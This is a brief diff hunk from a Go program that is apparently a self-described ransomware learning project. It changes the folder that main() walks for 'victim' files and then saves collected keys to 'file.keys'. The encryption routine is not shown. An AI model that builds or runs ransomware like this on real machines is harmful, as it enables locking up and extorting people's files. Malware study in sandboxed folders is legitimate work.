@@ -90,7 +90,7 @@ func zero(bs []byte) {
 }
 
 func main() {
-	filepath.Walk("C:\\Users\\tacixat\\prog\\ransomware\\victim", walker)
+	filepath.Walk("D:\\Documents\\Learning\\Projects\\RSAware\\_victim", walker)
 	data, _ := json.Marshal(eis)
 	os.WriteFile("file.keys", data, 0444)
 }
